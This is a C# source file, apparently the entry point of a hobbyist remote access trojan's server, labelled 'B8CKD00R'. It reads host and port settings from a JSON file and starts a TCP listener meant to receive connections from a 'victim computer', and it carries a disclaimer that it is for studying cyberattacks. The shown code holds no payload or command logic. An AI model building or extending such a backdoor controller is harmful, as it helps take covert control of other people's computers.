/*
 * RAT SERVER (B8CKD00R)
 * Creator - Sp3cul0
 * Description - This program listening an hosting IPV4 address and HTTP port to a victim computer. NO USING FOR ILLEGAL INSTRUCTIONS BUT ONLY FOR STUDYING CYBERATTACKS !!!
 * Creation Date - 23.05.2024
 */

using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Text.Json;
using System;
using System.Text.Json.Serialization;
using ANA_Server;
using ANA_Server.Abstract;

internal class Program
{
    private static string filePath = Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "Mocks/", "Info.json");
    private static Hosting JsonRead()
    {
        string jsonString = File.ReadAllText(filePath);
        Hosting hosting = JsonSerializer.Deserialize<Hosting>(jsonString);
        return hosting;
    }

    private static string ReadName
    {
        get
        {
            return JsonRead().Name;
        }
    }

    private static int ReadPort
    {
        get
        {
            return JsonRead().Port;
        }
    }
    private static string ReadHost
    {
        get
        {
            return JsonRead().Host;
        }
    }
    private static async Task Main(string[] args)
    {
        if (JsonRead != null)
        {
            Console.WriteLine("JSON File Founded !");
            Console.WriteLine($"Your server name is : {ReadName} Hosted in {ReadHost}:{ReadPort}");
            Server server = new Server(new byte[1024], new IPEndPoint(IPAddress.Any, ReadPort), new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp));
            await server.Listener();
        }
        else
        {
            Console.WriteLine($"{filePath} doesnt exists ! Program end...");
            return;
        }
    }
}
